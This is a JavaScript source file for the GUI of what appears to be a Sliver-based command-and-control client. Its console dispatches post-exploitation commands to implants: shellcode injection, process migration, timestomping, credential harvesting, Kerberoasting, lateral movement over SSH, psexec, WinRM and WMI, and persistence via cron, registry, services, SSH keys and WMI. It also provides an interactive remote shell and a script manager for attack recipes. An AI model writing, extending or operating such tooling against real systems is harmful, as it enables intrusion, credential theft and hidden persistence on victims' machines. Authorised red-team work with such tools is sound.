    case 'wg-portfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().WGStartPortForward(id, parseInt(args[1]), args[2]); return appendOut(id, `[+] WG forward 127.0.0.1:${args[1]} -> ${args[2]}`, 'out'); }
      if (sub === 'rm')  { await App().WGStopPortForward(id, parseInt(args[1])); return appendOut(id, `[+] WG forward ${args[1]} stopped`, 'out'); }
      return appendOut(id, 'usage: wg-portfwd add <lport> <remoteHost:port> | rm <id>', 'err');
    }
    case 'wg-socks': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'stop') { await App().WGStopSocks(id, parseInt(args[1])); return appendOut(id, `[+] WG socks ${args[1]} stopped`, 'out'); }
      await App().WGStartSocks(id, parseInt(args[0])||1081);
      return appendOut(id, `[+] WG SOCKS proxy on 127.0.0.1:${parseInt(args[0])||1081}`, 'out');
    }
    case 'loot': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') {
        if (!args[1]) return appendOut(id, 'usage: loot add <remote_path>', 'err');
        appendOut(id, `[*] looting ${args[1]}...`, 'pending');
        const err = await App().LootFile(id, args.slice(1).join(' ')).then(() => null).catch(e => String(e));
        return appendOut(id, err ? `[error] ${err}` : `[+] added ${args[1]} to the shared loot store`, err?'err':'out');
      }
      if (sub === 'rm') { await App().DeleteLoot(args[1]); return appendOut(id, `[+] loot ${args[1]} removed`, 'out'); }
      const loot = await App().GetLoot().catch(() => []);
      if (!loot.length) return appendOut(id, '[*] loot store is empty (use: loot add <remote_path>)', 'info');
      let out = 'ID            TYPE        NAME\n';
      loot.forEach(l => { out += `${(l.id||'').slice(0,12).padEnd(14)}${(l.type||'').padEnd(12)}${l.name||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'runas': {
      let user='', pass='', dom='', rest=[];
      for (let i=0;i<args.length;i++){ if(args[i]==='-u')user=args[++i]||''; else if(args[i]==='-p')pass=args[++i]||''; else if(args[i]==='-d')dom=args[++i]||''; else rest.push(args[i]); }
      if(!user || !rest.length) return appendOut(id, 'usage: runas -u [DOMAIN\\]<user> [-p <pass>] <program> [args]', 'err');
      // Split DOMAIN\user (or user@domain) into separate domain + username.
      if (user.includes('\\')) { const p = user.split('\\'); dom = dom || p[0]; user = p[1]; }
      else if (user.includes('@')) { const p = user.split('@'); user = p[0]; dom = dom || p[1]; }
      if (!dom) dom = '.';   // local account
      const outp = await App().RunAs(id, user, dom, pass, rest[0], rest.slice(1).join(' '));
      return appendOut(id, outp || '[+] done', 'out');
    }
    case 'migrate': {
      if (args.length < 2) return appendOut(id, 'usage: migrate <pid> <profile>  (profile = a saved implant profile)', 'err');
      const err = await App().Migrate(id, parseInt(args[0]), args[1]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] migration into PID ${args[0]} requested`, err?'err':'out');
    }
    case 'execute-shellcode': {
      // execute-shellcode <local-path> [pid]   (no path = file dialog)
      appendOut(id, args.length ? `[*] injecting ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
      const r = await App().ExecuteShellcode(id, args[0] || '', parseInt(args[1])||0);
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
    }
    case 'spawndll': {
      // spawndll <local-path> [args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] spawning ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
      const r = await App().SpawnDll(id, args[0] || '', args.slice(1).join(' '), '');
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
    }
    case 'chmod': { if (args.length < 2) return appendOut(id, 'usage: chmod <path> <mode>  (e.g. 0755)', 'err'); await App().Chmod(id, args[0], args[1]); return appendOut(id, `[+] chmod ${args[1]} ${args[0]}`, 'out'); }
    case 'chown': { if (args.length < 3) return appendOut(id, 'usage: chown <path> <uid> <gid>', 'err'); await App().Chown(id, args[0], args[1], args[2]); return appendOut(id, `[+] chown ${args[1]}:${args[2]} ${args[0]}`, 'out'); }
    case 'chtimes': case 'timestomp': {
      if (args.length < 2) return appendOut(id, 'usage: chtimes <path> <YYYY-MM-DD HH:MM:SS>', 'err');
      const ts = Math.floor(new Date(args.slice(1).join(' ')).getTime()/1000);
      if (isNaN(ts)) return appendOut(id, 'invalid date - use e.g. 2021-01-01 09:00:00', 'err');
      await App().Chtimes(id, args[0], ts, ts);
      return appendOut(id, `[+] timestomped ${args[0]} -> ${args.slice(1).join(' ')}`, 'out');
    }
    case 'rportfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().StartRportFwd(id, '0.0.0.0', parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] reverse forward: target :${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
      if (sub === 'rm') { await App().StopRportFwd(id, parseInt(args[1])); return appendOut(id, `[+] removed reverse forward ${args[1]}`, 'out'); }
      const fwds = await App().ListRportFwds(id);
      return appendOut(id, fwds.length ? fwds.map(f => `#${f.id} ${f.bind} -> ${f.forward}`).join('\n') : '[*] no reverse port forwards', 'info');
    }
    case 'getpid': return appendOut(id, String(tab.obj.pid), 'out');
    case 'getuid': case 'getgid': return dispatchCmd(kind, id, 'whoami');
    // ── Script commands (spawn / jump / persist / harvest / scan) ──
    case 'spawn': case 'jump': {
      // TWO modes:
      // 1) Local spawn (no creds): spawn <os> <arch> <listener_type>
      //    e.g. spawn windows x64 http
      //    e.g. spawn linux x64 mtls
      // 2) Remote spawn (with target): spawn linux user@host -p pass listener_url
      //    e.g. spawn linux root@192.168.50.20 -p toor mtls://...

      const sub = args[0] || '';

      // Detect mode: if no '@' in any arg and sub is an OS name → LOCAL spawn
      const hasTarget = args.some(a => a.includes('@'));
      const isLocalSpawn = !hasTarget && (sub === 'windows' || sub === 'linux' || sub === 'win' || sub === 'lin') && cmd === 'spawn';

      if (isLocalSpawn) {
        // spawn <os> <arch> <profile_name>
        const osTarget = (sub === 'win') ? 'windows' : sub;
        const archVal = args[1] || 'x64';
        const profile = args[2] || '';
        if (!profile) return appendOut(id, `usage: spawn ${osTarget} ${archVal} <profile_name>\n\nCreate a profile first:\n  Profiles panel → Create\n  Or: profiles new --mtls host:port --os ${osTarget} --beacon --name my-profile`, 'err');
        appendOut(id, `[*] Spawning ${osTarget}/${archVal} from profile '${profile}' on current host...`, 'pending');
        const r = await App().ScriptSpawnLocal(id, osTarget, archVal, profile);
        if (!r.error) renderGraph();
        return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
      }

      // Remote spawn / jump
      let targetStr = args[1] || '';
      let pass = '';
      const pi2 = args.indexOf('-p');
      if (pi2 >= 0) { pass = args[pi2+1]||''; args.splice(pi2, 2); targetStr = args[1]||''; }
      const listenerUrl = args[args.length-1] || '';
      // Parse user@host:port
      let user = 'root', host = '', port = 22;
      if (targetStr.includes('@')) { const p = targetStr.split('@'); user = p[0]; const hp = p[1].split(':'); host = hp[0]; if (hp[1]) port = parseInt(hp[1]); }
      else { host = targetStr; }
      if (!host || !listenerUrl) return appendOut(id, `usage:\n  ${cmd} <os> <arch> <listener>  (local spawn)\n  ${cmd} linux|windows <user>@<host> [-p <pass>] <listener_url>  (remote)`, 'err');
      appendOut(id, `[*] ${cmd} ${sub} → ${user}@${host}:${port} via ${listenerUrl}`, 'pending');
      let r;
      if (sub === 'linux' || sub === 'ssh') {
        r = await App().ScriptSpawnLinux(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'windows' || sub === 'psexec' || sub === 'psexec64') {
        r = await App().ScriptSpawnWindows(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'winrm') {
        r = await App().ScriptWinRMExec(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'wmi') {
        r = await App().ScriptWMIExec(id, host, port, user, pass, listenerUrl);
      } else {
        return appendOut(id, `unknown type: ${sub}. Use: linux, windows, ssh, psexec, winrm, wmi`, 'err');
      }
      if (!r.error) {
        // Every jump records lateral-move lineage (source → target) so the graph
        // shows where the operator moved from. The pivot is authoritative and the
        // wouldCycle guard in renderGraph prevents a jump from flipping a chain.
        if (host) recordJump(id, host);
        renderGraph();
      }
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'privesc-check': case 'privesc': {
      appendOut(id, '[*] Running privilege escalation checks...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinPrivescCheck(id) : await App().ScriptPrivescCheck(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'harvest': {
      appendOut(id, '[*] Harvesting credentials...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinHarvestCreds(id) : await App().ScriptHarvestCreds(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'ad-enum': case 'adenum': {
      appendOut(id, '[*] Enumerating Active Directory...', 'pending');
      const r = await App().ScriptADEnum(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'local-enum': case 'localenum': {
      appendOut(id, '[*] Running local enumeration...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinLocalEnum(id) : await App().ScriptPrivescCheck(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'kerberoast': {
      appendOut(id, '[*] Kerberoasting...', 'pending');
      const r = await App().ScriptKerberoast(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'persist': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'cron') { const r = await App().ScriptPersistCron(id, args.slice(1).join(' ')); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'reg') { const r = await App().ScriptPersistRegRun(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'schtask') { const r = await App().ScriptPersistSchedTask(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'service') { const r = await App().ScriptPersistService(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'ssh-key') { const r = await App().ScriptPersistSSHKey(id, args.slice(1).join(' '), 'root'); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'systemd') { const r = await App().ScriptPersistSystemd(id, args[1]||'', args[2]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'wmi') { const r = await App().ScriptPersistWMI(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'startup') { const r = await App().ScriptPersistStartup(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      return appendOut(id, 'usage: persist cron|reg|schtask|service|ssh-key|systemd|wmi|startup [args]', 'err');
    }
    case 'scan': {
      const subnet = args[0] || '192.168.50';
      const ports = args.slice(1).join(' ') || '22 445 3306 2375 3000 8080';
      appendOut(id, `[*] Scanning ${subnet}.0/24 ports: ${ports}...`, 'pending');
      const r = await App().ScriptNetworkScan(id, subnet, ports);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    default: {
      // Server/panel commands are not session commands - guide instead of
      // silently running them in cmd.exe.
      const serverCmds = { sessions:1, beacons:1, jobs:1, listeners:1, generate:1, profiles:1, builds:1, 'implant-builds':1, operators:1, hosts:1, use:1, background:1, players:1, 'new-operator':1 };
      if (serverCmds[cmd]) {
        return appendOut(id, `[!] '${cmd}' is a server/management command - use the toolbar at the top (this console runs commands on the target). Type 'help' for session commands, or 'shell ${raw}' to force an OS shell.`, 'err');
      }
      // Otherwise run it in the target's OS shell (cmd.exe / /bin/sh).
      const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
      if (!shellCmd.trim()) return;
      const r = await App().ExecuteCommand(id, shellCmd).catch(e => ({ error: String(e) }));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
      return;
    }
  }
}

// pollBeaconResult polls the beacon task queue until the given task completes,
// then prints its output. Non-blocking - the console stays usable meanwhile.
// Two-pronged: checks task list state AND directly fetches result as fallback.
function pollBeaconResult(id, taskId, tries = 0) {
  if (!openTabs[id]) return;
  if (!pendingBeaconTasks[taskId]) return;
  const interval = tries < 20 ? 3000 : tries < 60 ? 5000 : 15000;
  if (tries === 60) appendOut(id, `[*] task ${taskId.slice(0,8)} still pending - slow poll (15s). Result will appear automatically.`, 'pending');
  setTimeout(async () => {
    try {
      if (!openTabs[id]) return;
      if (!pendingBeaconTasks[taskId]) return;

      let taskListErr = null;
      const tasks = await App().GetBeaconTasks(id).catch(e => { taskListErr = e; return null; });
      // Event handler may have raced ahead during the await above and already
      // fetched+rendered the result. If so, our registry entry is gone — bail.
      if (!pendingBeaconTasks[taskId]) return;
      const t = tasks ? tasks.find(x => x.id === taskId) : null;
      const state = t ? t.state.toLowerCase().trim() : '';

      if (tries > 0 && tries % 10 === 0) {
        const _bcn = allBeacons.find(b => b.id === id);
        if (_bcn && _bcn.isDead) {
          delete pendingBeaconTasks[taskId];
          appendOut(id, `[!] beacon is DEAD - task ${taskId.slice(0,8)} will not complete. Re-deploy the implant.`, 'err');
          return;
        }
        if (_bcn && _bcn.lastCheckinTs > 0) {
          const ageSec = Math.floor(Date.now() / 1000) - _bcn.lastCheckinTs;
          const intSec = (_bcn.interval || 5000000000) / 1e9;
          if (ageSec > intSec * 10) {
            delete pendingBeaconTasks[taskId];
            appendOut(id, `[!] beacon hasn't checked in for ${ageSec}s (interval ${intSec}s) - likely dead. Task ${taskId.slice(0,8)} abandoned.`, 'err');
            return;
          }
        }
      }

      if (state.includes('complete') || state === 'done') {
        const _meta = pendingBeaconTasks[taskId];
        if (!_meta) return; // event handler beat us — already rendered
        const _cmdType = _meta.cmdType || '';
        delete pendingBeaconTasks[taskId];
        let fetchErr = null;
        const full = _cmdType
          ? await App().GetBeaconNativeResult(taskId, _cmdType).catch(e => { fetchErr = e; return null; })
          : await App().GetBeaconTaskResult(taskId).catch(e => { fetchErr = e; return null; });
        const output = (full && full.response) || (t && t.response) || '';
        appendOut(id, `[+] task ${taskId.slice(0,8)} completed`, 'ok');
        if (fetchErr) appendOut(id, `[debug] fetch error: ${fetchErr}`, 'warn');
        if (_cmdType === 'screenshot' && output.startsWith('data:image')) {
          appendImg(id, output);
        } else if (output.trim()) {
          appendOut(id, output.trimEnd(), 'out');
        } else {
          appendOut(id, `[debug] empty response — cmdType=${_cmdType} task summary desc="${t ? t.description : 'n/a'}"`, 'warn');
        }
        return;
      }
      if (state.includes('fail') || state.includes('cancel')) {
        delete pendingBeaconTasks[taskId];
        appendOut(id, `[error] task ${taskId.slice(0,8)} ${state}`, 'err');
        return;
      }
      // Direct fetch every 10 tries as fallback
      if (tries > 0 && tries % 10 === 0) {
        const _m2 = pendingBeaconTasks[taskId];
        if (!_m2) return; // event handler already rendered
        const _ct2 = _m2.cmdType || '';
        const direct = _ct2
          ? await App().GetBeaconNativeResult(taskId, _ct2).catch(() => null)
          : await App().GetBeaconTaskResult(taskId).catch(() => null);
        // Re-check after await — the event handler could have raced in.
        if (!pendingBeaconTasks[taskId]) return;
        if (direct && direct.response && direct.response.trim()) {
          delete pendingBeaconTasks[taskId];
          appendOut(id, `[+] task ${taskId.slice(0,8)} completed`, 'ok');
          if (_ct2 === 'screenshot' && direct.response.startsWith('data:image')) {
            appendImg(id, direct.response);
          } else {
            appendOut(id, direct.response.trimEnd(), 'out');
          }
          return;
        }
      }
      if (tries >= 200) {
        delete pendingBeaconTasks[taskId];
        appendOut(id, `[error] task ${taskId.slice(0,8)} timed out after 200 polls`, 'err');
        return;
      }
      pollBeaconResult(id, taskId, tries + 1);
    } catch (e) {
      appendOut(id, `[debug] poll exception: ${e}`, 'pending');
      if (tries < 200) pollBeaconResult(id, taskId, tries + 1);
    }
  }, interval);
}

// pollBeaconLatest - fallback when no task ID was returned. Watches ALL tasks
// for the beacon and prints the first newly-completed one it finds.
function pollBeaconLatest(id, tries = 0, seenIds = null) {
  if (!openTabs[id]) return;
  const interval = tries < 20 ? 2000 : tries < 60 ? 5000 : 15000;
  setTimeout(async () => {
    try {
      if (!openTabs[id]) return;
      const tasks = await App().GetBeaconTasks(id).catch(() => null);
      if (!tasks || !tasks.length) { pollBeaconLatest(id, tries + 1, seenIds); return; }
      // First call: snapshot existing task IDs so we only react to new completions
      if (!seenIds) {
        seenIds = new Set(tasks.filter(t => t.state === 'completed').map(t => t.id));
        pollBeaconLatest(id, tries + 1, seenIds);
        return;
      }
      for (const t of tasks) {
        if (t.state === 'completed' && !seenIds.has(t.id)) {
          const full = await App().GetBeaconTaskResult(t.id).catch(() => null);
          const output = (full && full.response) || t.response || '';
          appendOut(id, `[+] task ${t.id.slice(0,8)} completed`, 'ok');
          appendOut(id, output.trimEnd() || '(no output)', 'out');
          return;
        }
      }
      if (tries < 200) pollBeaconLatest(id, tries + 1, seenIds);
    } catch (e) {
      if (tries < 200) pollBeaconLatest(id, tries + 1, seenIds);
    }
  }, interval);
}

async function showTasks(id) {
  const tasks = await App().GetBeaconTasks(id).catch(e => { appendOut(id, `[error] ${e}`, 'err'); return null; });
  if (!tasks) return;
  if (!tasks.length) { appendOut(id, '[*] no tasks in queue', 'info'); return; }
  let out = 'ID        State       Created   Completed  Description\n';
  out +=    '--------  ----------  --------  ---------  -----------\n';
  tasks.forEach(t => {
    out += `${(t.id||'').slice(0,8).padEnd(10)}${(t.state||'').padEnd(12)}${(t.createdAt||'').padEnd(10)}${(t.completedAt||'').padEnd(11)}${t.description||''}\n`;
    if (t.response && t.state === 'completed') out += `  > ${t.response.slice(0,200)}\n`;
  });
  appendOut(id, out.trimEnd(), 'out');
}

function fmtSize(b) { if (!b) return '0B'; if (b<1024) return b+'B'; if (b<1048576) return (b/1024).toFixed(1)+'K'; return (b/1048576).toFixed(1)+'M'; }
function appendImg(id, dataUrl) {
  const out = document.getElementById(`cout-${id}`); if (!out) return;
  const img = document.createElement('img'); img.src = dataUrl;
  img.style.cssText = 'max-width:100%;border:1px solid var(--border);border-radius:4px;margin:6px 0;display:block;';
  out.appendChild(img); out.scrollTop = out.scrollHeight;
}
function appendOut(id, text, cls) {
  const out = document.getElementById(`cout-${id}`); if (!out) return;
  const s = document.createElement('span'); s.className = cls||'out'; s.textContent = text + '\n';
  out.appendChild(s); out.scrollTop = out.scrollHeight;
}

// ── Interactive shell (real-time PTY over a tunnel) ─────────────────────────
// Opens as a pinned docked tab (named by machine), like the per-agent console
// and server console - not a floating popup.
async function openInteractiveShell(agentId, obj) {
  const host = obj ? (obj.hostname || obj.id.slice(0,8)) : agentId;
  const isWin = obj && (obj.os||'').toLowerCase().includes('windows');
  let tid;
  try {
    tid = await App().StartInteractiveShell(agentId, '', !isWin);  // '' = implant default shell
  } catch (e) {
    return appendOut(agentId, `[error] could not start shell: ${e}`, 'err');
  }

  const dockId = `shell-${tid}`;
  const evtOut = `sliver:shell:${tid}`, evtClose = `sliver:shell-closed:${tid}`;
  // Register as a shell tab so closeTab() can tear the tunnel down.
  openTabs[dockId] = { kind: 'shell', tid, evtOut, evtClose };
  document.getElementById('empty-interact')?.remove();

  // Tab: named by machine, with a shell glyph.
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>▸ ${esc(host)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  // Panel: streaming output + input line.
  const outId = `sh-out-${tid}`, inId = `sh-in-${tid}`;
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML =
    `<pre id="${outId}" class="shell-out"><span class="info">[*] interactive shell on ${esc(host)} - type 'exit' or close the tab to end.\n</span></pre>
     <input id="${inId}" class="shell-in" placeholder="type a command and press Enter…" autocomplete="off" spellcheck="false"/>`;
  document.getElementById('interact-panels').appendChild(panel);

  const outEl = document.getElementById(outId), inEl = document.getElementById(inId);
  const append = t => { if (!outEl) return; outEl.appendChild(document.createTextNode(t)); outEl.scrollTop = outEl.scrollHeight; };
  const onData = b64 => { try { append(decodeB64(b64)); } catch(e){} };
  const onClose = () => { append('\n[*] shell closed\n'); if (inEl) inEl.disabled = true; if (window.runtime){ window.runtime.EventsOff(evtOut); window.runtime.EventsOff(evtClose); } };
  if (window.runtime) { window.runtime.EventsOn(evtOut, onData); window.runtime.EventsOn(evtClose, onClose); }
  if (inEl) {
    inEl.addEventListener('keydown', async e => {
      if (e.key !== 'Enter') return;
      const line = inEl.value; inEl.value = '';
      if (line.trim() === 'exit') { await App().StopInteractiveShell(tid).catch(()=>{}); onClose(); return; }
      await App().SendShellData(tid, encodeB64(line + '\n')).catch(err => append(`\n[send error] ${err}\n`));
    });
  }
  activateTab(dockId);
  setTimeout(() => inEl && inEl.focus(), 30);
}
// UTF-8 safe base64 helpers for shell I/O.
function encodeB64(str){ return btoa(unescape(encodeURIComponent(str))); }
function decodeB64(b64){ return decodeURIComponent(escape(atob(b64))); }

// ── Toolbar nav ────────────────────────────────────────────────────────────
// The old flat row of .tb-btn is replaced by grouped dropdown menus. Every
// menu item still carries data-view, so a single dispatch function serves
// both old and new markup - makes it easy to link a menu item from anywhere
// in the app (via switchView / .tb-btn / .menu-item) without ceremony.
function dispatchView(view) {
  if (!view) return;
  // Mark the corresponding menu item active - collapse dropdown afterward.
  document.querySelectorAll('.menu-item.active,.tb-btn.active').forEach(x => x.classList.remove('active'));
  const active = document.querySelector('.menu-item[data-view="' + view + '"],.tb-btn[data-view="' + view + '"]');
  if (active) active.classList.add('active');
  closeAllMenus();
  if (view === 'sessions' || view === 'beacons') { hideModal(); refreshAgents(); return; }
  const routes = {
    listeners: openListenersPanel, generate: openGeneratePanel, builds: openBuildsPanel,
    profiles: openProfilesPanel, events: openEventsPanel, loot: openLootPanel,
    creds: openCredsPanel, hosts: openHostsPanel, operators: openOperatorsPanel,
    scripts: openScriptsPanel, iocs: openIOCPanel, report: exportReport,
    c2profiles: openC2ProfileEditor, health: openChainHealthPanel,
    sleep: openBeaconSleepPanel, gallery: openGalleryPanel,
    recordings: openRecordingsPanel, watchdog: openWatchdogPanel,
    settings: openSettingsPanel, import: openImportPanel, websites: openWebsitesPanel,
  };
  const fn = routes[view] || window[routes[view]];
  if (typeof fn === 'function') fn();
  else toast('warn', 'Unknown view: ' + view);
}
// Delegated click handler - one listener catches every current and future
// menu-item / tb-btn click. Cheaper than rebinding after each panel reopens
// and dodges the "some items had their listener attached at load time only"
// class of bug.
document.addEventListener('click', e => {
  const el = e.target.closest('.menu-item,.tb-btn');
  if (!el) return;
  const view = el.dataset.view;
  if (view) { dispatchView(view); return; }
  // Non-view menu items (MITRE panel, shortcuts overlay, palette open) -
  // handled by their id below.
  if (el.id === 'menu-mitre')     { closeAllMenus(); (typeof openMitrePanel === 'function') && openMitrePanel(); }
  if (el.id === 'menu-shortcuts') { closeAllMenus(); (typeof openKbdHelp === 'function') && openKbdHelp(); }
  if (el.id === 'menu-palette')   { closeAllMenus(); (typeof openPalette === 'function') && openPalette(); }
});

// Menu-trigger open/close. Click a trigger to toggle its dropdown; click
// anywhere else to close all. Hover over a different trigger while a menu
// is open swaps to that menu (CS-style navigation).
function closeAllMenus() {
  document.querySelectorAll('.menu-group.open').forEach(g => g.classList.remove('open'));
}
document.addEventListener('click', e => {
  const trigger = e.target.closest('.menu-trigger');
  if (!trigger) {
    // Click outside any trigger - close open menus unless the click was
    // inside a dropdown (that's handled by the delegated .menu-item logic
    // above which calls closeAllMenus itself).
    if (!e.target.closest('.menu-dropdown')) closeAllMenus();
    return;
  }
  const group = trigger.parentElement;
  const wasOpen = group.classList.contains('open');
  closeAllMenus();
  if (!wasOpen) group.classList.add('open');
  e.stopPropagation();
});
document.addEventListener('mouseenter', e => {
  if (!e.target || !e.target.classList) return;
  const trigger = e.target.classList.contains('menu-trigger') ? e.target : null;
  if (!trigger) return;
  const anyOpen = document.querySelector('.menu-group.open');
  if (!anyOpen) return; // only swap if a menu is already open
  const group = trigger.parentElement;
  if (group.classList.contains('open')) return;
  closeAllMenus();
  group.classList.add('open');
}, true);
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeAllMenus(); });

// ── View panels (open in bottom interaction area) ──────────────────────────
// Config views (Generate, Listeners, Builds, Profiles, Events, Loot, Operators)
// render in a centered modal window rather than the cramped bottom console.
function openViewPanel(id, title, content) {
  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-body').innerHTML = content;
  document.getElementById('modal-overlay').classList.remove('hidden');
}
function hideModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
document.getElementById('modal-close').addEventListener('click', hideModal);

// ── Script Manager Panel (lateral movement / privesc / persistence) ──
// ── Script Manager Panel (lateral movement / privesc / persistence) ──
async function openScriptsPanel() {
  const scripts = await App().ListScripts().catch(() => []);
  const sessions = (allSessions || []).filter(s => s && s.id && !s.isDead);
  // Every script needs an interactive session to run against (the "pivot
  // session" from which the script fans out). Older builds would just show
  // an empty dropdown and the Preview / Execute buttons would silently
  // refuse to fire - reading as "Script Manager doesn't work". Now we
  // show a clear empty state if there are no live sessions.
  if (!scripts.length) {
    openViewPanel('scripts', 'Script Manager', `<div class="empty-state">
      <div class="empty-title">No scripts registered</div>
      <div class="empty-body">The GUI's built-in script catalogue didn't load. Check that the teamserver connection is healthy - reconnect and try again.</div>
    </div>`);
    return;
  }
  if (!sessions.length) {
    openViewPanel('scripts', 'Script Manager', `<div class="empty-state">
      <div class="empty-title">No live sessions</div>
      <div class="empty-body">Every recipe here runs against a "pivot" - a live interactive session used to fan out post-exploitation.<br/><br/>Generate a session-mode implant, deploy it, and the Script Manager will fill in.</div>
      <div class="empty-actions"><button class="btn small" onclick="switchView('generate')">Open Generate</button></div>
    </div>`);
    return;
  }

  // Group by category
  const cats = {};
  scripts.forEach(s => {
    if (!cats[s.category]) cats[s.category] = [];
    cats[s.category].push(s);
  });

  let sessionOpts = '<option value="">-- Select Pivot Session --</option>';
  sessions.forEach(s => {
    sessionOpts += `<option value="${s.id}">${s.hostname || s.id.slice(0,8)} (${s.remoteAddress})</option>`;
  });

  let html = `<div class="scripts-panel">
    <div class="scr-top-bar">
      <div style="flex:1">
        <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">PIVOT SESSION</label>
        <select id="scr-session" class="scr-input">${sessionOpts}</select>
      </div>
    </div>

    <div class="scr-main-layout">
      <!-- Left Pane: Categories & Recipe Form -->
      <div class="scr-left-pane">
        <!-- Parameter / Action Card -->
        <div id="scr-param-card" class="scr-param-card" style="display:none">
          <h3 id="scr-card-title"></h3>
          <p id="scr-card-desc"></p>
          <div id="scr-form-grid" class="scr-form-grid"></div>
          <div class="scr-actions">
            <button id="scr-btn-preview" class="scr-action-btn scr-btn-preview">Preview / Dry-Run</button>
            <button id="scr-btn-exec" class="scr-action-btn scr-btn-exec">Execute Script</button>
          </div>
        </div>

        <!-- Script Categories Grid -->
        <div class="scr-categories">`;

  for (const [cat, items] of Object.entries(cats)) {
    html += `<div class="scr-cat"><h4>${cat}</h4><div class="scr-btns">`;
    items.forEach(s => {
      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
      const opsecClass = (s.opsec || 'low').toLowerCase();
      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
      html += `<button class="scr-btn" data-method="${esc(s.method)}" title="${esc(s.description)}">
        <span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}
      </button>`;
    });
    html += `</div></div>`;
  }

  html += `  </div>
      </div>

      <!-- Right Pane: Output / Preview Console -->
      <div class="scr-right-pane">
        <div class="scr-output-wrap">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">CONSOLE OUTPUT / PREVIEW</label>
            <button class="btn small" onclick="document.getElementById('scr-output').textContent='Select a script and click Preview or Execute...';">Clear</button>
          </div>
          <pre id="scr-output" class="scr-output">Select a script recipe on the left to configure parameters and run...</pre>
        </div>
      </div>
    </div>
  </div>`;

  openViewPanel('scripts', 'Script Manager', html);

  // Script selection state
  let currentScript = null;

  const scriptMap = {};
  scripts.forEach(s => { scriptMap[s.method] = s; });

  const paramCard = document.getElementById('scr-param-card');
  const cardTitle = document.getElementById('scr-card-title');
  const cardDesc = document.getElementById('scr-card-desc');
  const formGrid = document.getElementById('scr-form-grid');
  const btnPreview = document.getElementById('scr-btn-preview');
  const btnExec = document.getElementById('scr-btn-exec');
  const out = document.getElementById('scr-output');

  function selectScript(method) {
    const s = scriptMap[method];
    if (!s) return;
    currentScript = s;

    // Update active button state
    document.querySelectorAll('.scr-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.method === method);
    });

    // Header info
    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
    const opsecClass = (s.opsec || 'low').toLowerCase();
    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} Noise</span>` : '';
